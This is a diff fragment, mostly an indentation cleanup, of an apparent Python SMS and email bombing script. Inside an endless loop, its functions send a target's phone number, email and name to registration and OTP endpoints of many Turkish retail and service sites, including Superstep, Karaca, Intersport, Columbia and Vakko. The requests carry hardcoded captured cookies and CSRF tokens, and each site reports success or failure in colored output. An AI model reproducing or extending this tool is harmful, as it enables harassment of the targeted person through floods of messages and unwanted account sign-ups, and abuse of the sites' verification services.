                 'first_name': f'{ad}',
                 'last_name': f'{soyad}',
@@ -850,15 +850,15 @@ while True:
                 'is_allowed': 'true',
                 'confirm': 'true',
                 'permissions': 'on',
-                }
+            }
 
-                response = requests.post('https://www.superstep.com.tr/users/registration/', cookies=cookies, headers=headers, data=data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Superstep ====> https://www.superstep.com.tr"+ Style.RESET_ALL)
+            response = requests.post('https://www.superstep.com.tr/users/registration/', cookies=cookies, headers=headers, data=data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Superstep ====> https://www.superstep.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Superstep Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTRED_EX + "[-]" + "Superstep Arıza"+ Style.RESET_ALL)
     def yargici():
         try:
-                cookies = {
+            cookies = {
                 'inCommerce.customer.info': '1467e3bb-aafe-4d81-92b7-c6c53bfa289c',
                 'SelectedRegion': 'true',
                 '_gcl_au': '1.1.1416637135.1709060201',
@@ -875,9 +875,9 @@ while True:
                 '_ga_KPGC21WKW4': 'GS1.1.1709060203.1.1.1709060719.0.0.221798879',
                 '_ga': 'GA1.2.157942275.1709060202',
                 '_ga_73R69YJ2KE': 'GS1.1.1709060201.1.1.1709060740.34.0.346116205',
-                }
+            }
 
-                headers = {
+            headers = {
                 'authority': 'www.yargici.com',
                 'accept': '*/*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -893,21 +893,21 @@ while True:
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                 'x-requested-with': 'XMLHttpRequest',
-                }
+            }
 
-                data = {
+            data = {
                 'email': f'{mail}',
                 'phoneNumber': f'+90{phone}',
-                }
-                response = requests.post(
+            }
+            response = requests.post(
                 'https://www.yargici.com/customer/CustomerExistControlRegister',
                 cookies=cookies,
                 headers=headers,
                 data=data
-                )
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Yargici ====> https://www.yargici.com"+ Style.RESET_ALL)
+            )
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Yargici ====> https://www.yargici.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX +  "[-]" + "Yargici Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTRED_EX +  "[-]" + "Yargici Arıza"+ Style.RESET_ALL)
     def englishhome():
         try:
             url = "https://www.englishhome.com:443/api/member/sendOtp"
@@ -916,10 +916,10 @@ while True:
             r = requests.post(url, headers=headers, json=json)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Englishhome ====> https://www.englishhome.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX +  "[-]" + "Englishhome Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTRED_EX +  "[-]" + "Englishhome Arıza"+ Style.RESET_ALL)
     def karaca():
         try:
-                cookies = {
+            cookies = {
                 'language': 'tr',
                 'frequency': 'd41d8cd98f00b204e9800998ecf8427e',
                 'currency': 'TRY',
@@ -949,9 +949,9 @@ while True:
                 '_hjSessionUser_452528': 'eyJpZCI6IjIxYjJmYjI3LTA0ZjMtNWNjMS04MzNlLWMyMDU3ZGM0YzM4YiIsImNyZWF0ZWQiOjE3MDkwMzg1MDk5MTcsImV4aXN0aW5nIjp0cnVlfQ==',
                 '_ga_V034H5QVBN': 'GS1.1.1709038507.1.1.1709038529.0.0.0',
                 '_gali': 'reg-submit-without-recaptch',
-                }       
+            }
 
-                headers = {
+            headers = {
                 'authority': 'www.karaca.com',
                 'accept': 'application/json, text/plain, */*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -973,25 +973,25 @@ while True:
                 'x-kl-kis-ajax-request': 'Ajax_Request',
                 'x-newrelic-id': 'VwcBV1ZVDRAEV1JWBwIAUlQ=',
                 'x-requested-with': 'XMLHttpRequest',
-                }
+            }
 
-                json_data = {
+            json_data = {
                 'telephone': f'{phone}',
                 'logged': True,
-                }
+            }
 
-                response = requests.post(
+            response = requests.post(
                 'https://www.karaca.com/index.php?route=api/user/sendUserVerification',
                 cookies=cookies,
                 headers=headers,
                 json=json_data,
-                )
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Karaca ====> https://www.karaca.com"+ Style.RESET_ALL)
+            )
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Karaca ====> https://www.karaca.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX +  "[-]" + "Karaca Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTRED_EX +  "[-]" + "Karaca Arıza"+ Style.RESET_ALL)
     def intersport():
         try:
-                cookies = {
+            cookies = {
                 'sessionid': 'ppzjywmi5zzp6fpcrwvfwflhyllli377',
                 'scarab.visitor': '%2212C4E1F6DD267D5F%22',
                 'OptanonAlertBoxClosed': '2024-02-29T14:11:53.619Z',
@@ -1008,9 +1008,9 @@ while True:
                 'cto_bundle': 'Bnn9y19abFVMS1llRmRCVUthWE4xJTJCc0ltbEw1Y1Q2TDVBTW01QlNUUzZMJTJCQWglMkIybWJUdXNYbENjJTJCJTJGS0RaVSUyRkk0bTJ3eFBUblpZWlh2UWxMSXRwSFpBeTRiZ3BpMGZwSzRoTDd2bFRYemJyNmVmWjZnTGlPOFphU3FjaWd6ZUolMkZYcHd0JTJCTyUyQmprUzF6WCUyRk9za1JYU0xRcFBpb1pJQjBpZ0xKbkg2S2N6ejlHbzl2enc5eWZETjM5Smk2NnlMU1lQWnZkVUZxakVlbHR4dW5TS3NHWHNhcW00MVElM0QlM0Q',
                 '_clsk': '1ieic1n%7C1709215914954%7C1%7C1%7Cw.clarity.ms%2Fcollect',
                 '_ga_KKS3H7YT5W': 'GS1.1.1709215912.1.1.1709215933.40.0.346834227',
-                }
+            }
 
-                headers = {
+            headers = {
                 'authority': 'www.intersport.com.tr',
                 'accept': 'application/json, text/plain, */*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -1026,8 +1026,8 @@ while True:
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                 'x-csrftoken': 'rsFErGU87zAR89vClK3MhHGMXml13qmkyUjCcP8SZFo4bjuoJFgXQqnjU4Zd403j',
-                }
-                json_data = {
+            }
+            json_data = {
                 'email': f'{mail}',
                 'first_name': f'{ad}',
                 'last_name': f'{soyad}',
@@ -1040,22 +1040,22 @@ while True:
                 'gender': 'female',
                 'confirm': True,
                 'attributes': '{"confirm":true}',
-                }
-                response = requests.post('https://www.intersport.com.tr/users/register/', cookies=cookies, headers=headers, json=json_data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "İntersport ====> https://www.intersport.com.tr"+ Style.RESET_ALL)
+            }
+            response = requests.post('https://www.intersport.com.tr/users/register/', cookies=cookies, headers=headers, json=json_data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "İntersport ====> https://www.intersport.com.tr"+ Style.RESET_ALL)
         except:
-                print( Fore.LIGHTRED_EX + "[-]" + "İntersport Arıza" + Style.RESET_ALL)
+            print( Fore.LIGHTRED_EX + "[-]" + "İntersport Arıza" + Style.RESET_ALL)
     def naosstar(): #1
         try :
             cookies = {
-            '_fbp': 'fb.1.1730774182039.439120454238120621',
-            '_tt_enable_cookie': '1',
-            '_ttp': 'hTXtZr0I_pGh5ETCV6bATZR7j5w',
-            '_hjSession_3176877': 'eyJpZCI6IjRmZWIxNmUyLTBlYTUtNDA0MS1iZGFjLTA0ZmI1MDA2MDYzZiIsImMiOjE3MzA3NzQxODI2NjEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
-            'OfferMiner_ID': 'NCTIUTPJOIIMEFOK20241105053623',
-            '_hjSessionUser_3176877': 'eyJpZCI6ImMwOTg5ZTI2LTA0NWItNTQ1Yi1iMDE2LTBhZjc2Y2E1MjM5YSIsImNyZWF0ZWQiOjE3MzA3NzQxODI2NjEsImV4aXN0aW5nIjp0cnVlfQ==',
-            'VL_CM_0': '%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-11-05%252005%253A37%253A02%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-11-05%252005%253A37%253A02%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2239%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-11-05%252005%253A36%253A23%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-11-05%252005%253A36%253A23%22%2C%22E%22%3A%222024-11-05%2006%3A06%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22NCTIUTPJOIIMEFOK20241105053623%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.google.com%252F%22%2C%22E%22%3A%222024-12-05%2005%3A36%3A24%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fnaosstars.com%252Fuser%252Flogin%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A24%22%7D%5D%7D',
-            'naos_session': 'eyJpdiI6IkJJR3J6RVo4SFNVOG4ybXRXY25jZkE9PSIsInZhbHVlIjoicmptd2NoV1JRT2M0Wm1lUkpiWjZkU0tsenRtektzZ2JFaTk0anBQcFFCZXVtcklPV0dORUU0VFZ5TUNSaDRXY2VVN3pFdHVzdHQ4aEw2SzNSTVBEeVptcGx6NDBNMVFGRFNuaTRwM1VHN0VxbEV3MUFuRDVSajNvZzJxck8zaDIiLCJtYWMiOiJiODlkNDhjNGVhNDk3NDA4OTU3OWJhZTk5MGFhZGY3ODA1ZDg1Njg1MjZmYmQ2MThlY2RlZTYzMDM1YTI4MWY4IiwidGFnIjoiIn0%3D',
+                '_fbp': 'fb.1.1730774182039.439120454238120621',
+                '_tt_enable_cookie': '1',
+                '_ttp': 'hTXtZr0I_pGh5ETCV6bATZR7j5w',
+                '_hjSession_3176877': 'eyJpZCI6IjRmZWIxNmUyLTBlYTUtNDA0MS1iZGFjLTA0ZmI1MDA2MDYzZiIsImMiOjE3MzA3NzQxODI2NjEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
+                'OfferMiner_ID': 'NCTIUTPJOIIMEFOK20241105053623',
+                '_hjSessionUser_3176877': 'eyJpZCI6ImMwOTg5ZTI2LTA0NWItNTQ1Yi1iMDE2LTBhZjc2Y2E1MjM5YSIsImNyZWF0ZWQiOjE3MzA3NzQxODI2NjEsImV4aXN0aW5nIjp0cnVlfQ==',
+                'VL_CM_0': '%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-11-05%252005%253A37%253A02%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-11-05%252005%253A37%253A02%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2239%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-11-05%252005%253A36%253A23%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-11-05%252005%253A36%253A23%22%2C%22E%22%3A%222024-11-05%2006%3A06%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22NCTIUTPJOIIMEFOK20241105053623%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A23%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-11-05%2006%3A07%3A02%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.google.com%252F%22%2C%22E%22%3A%222024-12-05%2005%3A36%3A24%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fnaosstars.com%252Fuser%252Flogin%22%2C%22E%22%3A%222026-10-26%2005%3A37%3A02%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-10-26%2005%3A36%3A24%22%7D%5D%7D',
+                'naos_session': 'eyJpdiI6IkJJR3J6RVo4SFNVOG4ybXRXY25jZkE9PSIsInZhbHVlIjoicmptd2NoV1JRT2M0Wm1lUkpiWjZkU0tsenRtektzZ2JFaTk0anBQcFFCZXVtcklPV0dORUU0VFZ5TUNSaDRXY2VVN3pFdHVzdHQ4aEw2SzNSTVBEeVptcGx6NDBNMVFGRFNuaTRwM1VHN0VxbEV3MUFuRDVSajNvZzJxck8zaDIiLCJtYWMiOiJiODlkNDhjNGVhNDk3NDA4OTU3OWJhZTk5MGFhZGY3ODA1ZDg1Njg1MjZmYmQ2MThlY2RlZTYzMDM1YTI4MWY4IiwidGFnIjoiIn0%3D',
             }
             headers = {
                 'accept': 'application/json',
@@ -1101,7 +1101,7 @@ while True:
             pass
     def salonrandevu():
         try:
-                headers = {
+            headers = {
                 'authority': 'api.salonrandevu.com',
                 'accept': '*/*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -1115,21 +1115,21 @@ while True:
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-site',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-                }       
-                                                    
-                json_data = {
+            }
+
+            json_data = {
                 'phone': phone,
                 'mail': mail,
                 'dialCode': '+90',
-                }
+            }
 
-                response = requests.post('https://api.salonrandevu.com/api/v1/register', headers=headers, json=json_data) 
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Salonrandevu ====> https://api.salonrandevu.com"+ Style.RESET_ALL)
+            response = requests.post('https://api.salonrandevu.com/api/v1/register', headers=headers, json=json_data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Salonrandevu ====> https://api.salonrandevu.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Salonrandevu Arıza"+ Fore.LIGHTWHITE_EX)
+            print(Fore.LIGHTRED_EX + "[-]" + "Salonrandevu Arıza"+ Fore.LIGHTWHITE_EX)
     def Columbia():
         try:
-                cookies = {
+            cookies = {
                 '_ga': 'GA1.3.1112719085.1709062944',
                 '_gid': 'GA1.3.991523276.1709062944',
                 '_gac_UA-48957753-1': '1.1709062944.CjwKCAiArfauBhApEiwAeoB7qClid6nhl1pZh-Bigxk0fpOgbIx6z5oStAEpimAmxe6gDRJH1dpWSBoCfQ4QAvD_BwE',
@@ -1155,9 +1155,9 @@ while True:
                 'cookie_consent_user_accepted': 'true',
                 '_gcl_au': '1.1.1974680465.1709063361',
                 '_ga_S8CE2Z5F5J': 'GS1.1.1709063353.1.0.1709063361.60.0.0',
-                }
+            }
 
-                headers = {
+            headers = {
                 'authority': 'www.columbia.com.tr',
                 'accept': 'application/json, text/plain, */*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -1175,9 +1175,9 @@ while True:
                 'sec-fetch-site': 'same-origin',
                 'traceparent': '00-420f76d14dbfc1f5c9be22e635e4e800-87c99dcfc3575266-01',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-                }
+            }
 
-                json_data = {
+            json_data = {
                 'firstName': f'{ad}',
                 'lastName': f'{soyad}',
                 'email': f'{mail}',
@@ -1188,52 +1188,52 @@ while True:
                 'kvkkPermission': True,
                 'callPermission': True,
                 'isConsentTextConfirmed': True,
-                }
-                response = requests.post(
+            }
+            response = requests.post(
                 'https://www.columbia.com.tr/api/customer/customerpolicy/setpermission',
                 cookies=cookies,
                 headers=headers,
                 json=json_data,
-                )
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Columbia ====> https://www.columbia.com.tr"+ Style.RESET_ALL)
+            )
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Columbia ====> https://www.columbia.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTWHITE_EX + "[-]" + "Columbia Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTWHITE_EX + "[-]" + "Columbia Arıza"+ Style.RESET_ALL)
     def tiklagelsin():
         try:
-            headers = {     
-            'authority': 'www.vakko.com',
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/json',
-            # 'cookie': 'sessionid=6wxg8ks80wc7e7us24cfjxdtfzqjdlwc; _gid=GA1.2.1721728972.1708721773; _gac_UA-16233710-1=1.1708721773.Cj0KCQiAoeGuBhCBARIsAGfKY7z_T3bD0iPpyysFLAXpjy-Eqf53rLmcdTEH1J8_WOemZJzgSzMwNOwaApbQEALw_wcB; OfferMiner_ID=YKPCYRUERYXIPQVH20240223235613; OptanonAlertBoxClosed=2024-02-23T20:56:21.444Z; _gcl_au=1.1.1172612798.1708721781; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22ShCaSfj4f3zwl3Z02Igp%22%7D; _p2s_uvi=d1abff01.1949391980637285.1708721782033; _hjSession_883027=eyJpZCI6ImQyNzYyNWU4LTgzZDItNGYyOS1iOTEwLWJhNWU4MDdhOThhYyIsImMiOjE3MDg3MjE3ODIwNjgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1708721782087.577100634; _ga_000D6QJ06S=GS1.1.1708721772.1.1.1708721783.49.0.0; _ga=GA1.1.1013944145.1708721772; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Feb+23+2024+23%3A56%3A23+GMT%2B0300+(GMT%2B03%3A00)&version=202312.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=&consentId=b61fea45-f90a-463b-8eac-b93b12c5d9e0&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=%3B; _hjSessionUser_883027=eyJpZCI6IjY2NDcwODYyLTE3MTAtNWVhYi1hMWIwLTliZTkzZDc3NjIyYyIsImNyZWF0ZWQiOjE3MDg3MjE3ODIwNjcsImV4aXN0aW5nIjp0cnVlfQ==; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A23%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A23%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2211%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A13%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%224%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%224%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A13%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A13%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22YKPCYRUERYXIPQVH20240223235613%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.google.com%252F%22%2C%22E%22%3A%222024-03-24%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.vakko.com%252Fusers%252Flogin%252F%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%5D%7D; csrftoken=YEXgtwHReXOA5CNLsg2M6xmdEogNlcC0vLX8Lj9LTxvZyBC79YQe7SBRgF4xk6kW',
-            'origin': 'https://www.vakko.com',
-            'referer': 'https://www.vakko.com/users/register/',
-            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'x-csrftoken': 'YEXgtwHReXOA5CNLsg2M6xmdEogNlcC0vLX8Lj9LTxvZyBC79YQe7SBRgF4xk6kW',
-            'x-kl-kis-ajax-request': 'Ajax_Request',
+            headers = {
+                'authority': 'www.vakko.com',
+                'accept': 'application/json, text/plain, */*',
+                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+                'content-type': 'application/json',
+                # 'cookie': 'sessionid=6wxg8ks80wc7e7us24cfjxdtfzqjdlwc; _gid=GA1.2.1721728972.1708721773; _gac_UA-16233710-1=1.1708721773.Cj0KCQiAoeGuBhCBARIsAGfKY7z_T3bD0iPpyysFLAXpjy-Eqf53rLmcdTEH1J8_WOemZJzgSzMwNOwaApbQEALw_wcB; OfferMiner_ID=YKPCYRUERYXIPQVH20240223235613; OptanonAlertBoxClosed=2024-02-23T20:56:21.444Z; _gcl_au=1.1.1172612798.1708721781; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22ShCaSfj4f3zwl3Z02Igp%22%7D; _p2s_uvi=d1abff01.1949391980637285.1708721782033; _hjSession_883027=eyJpZCI6ImQyNzYyNWU4LTgzZDItNGYyOS1iOTEwLWJhNWU4MDdhOThhYyIsImMiOjE3MDg3MjE3ODIwNjgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1708721782087.577100634; _ga_000D6QJ06S=GS1.1.1708721772.1.1.1708721783.49.0.0; _ga=GA1.1.1013944145.1708721772; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Feb+23+2024+23%3A56%3A23+GMT%2B0300+(GMT%2B03%3A00)&version=202312.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=&consentId=b61fea45-f90a-463b-8eac-b93b12c5d9e0&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=%3B; _hjSessionUser_883027=eyJpZCI6IjY2NDcwODYyLTE3MTAtNWVhYi1hMWIwLTliZTkzZDc3NjIyYyIsImNyZWF0ZWQiOjE3MDg3MjE3ODIwNjcsImV4aXN0aW5nIjp0cnVlfQ==; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A23%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A23%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2211%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A13%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%224%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%224%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-23%252023%253A56%253A13%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A13%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22YKPCYRUERYXIPQVH20240223235613%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-24%2000%3A26%3A23%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.google.com%252F%22%2C%22E%22%3A%222024-03-24%2023%3A56%3A13%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.vakko.com%252Fusers%252Flogin%252F%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%5D%7D; csrftoken=YEXgtwHReXOA5CNLsg2M6xmdEogNlcC0vLX8Lj9LTxvZyBC79YQe7SBRgF4xk6kW',
+                'origin': 'https://www.vakko.com',
+                'referer': 'https://www.vakko.com/users/register/',
+                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
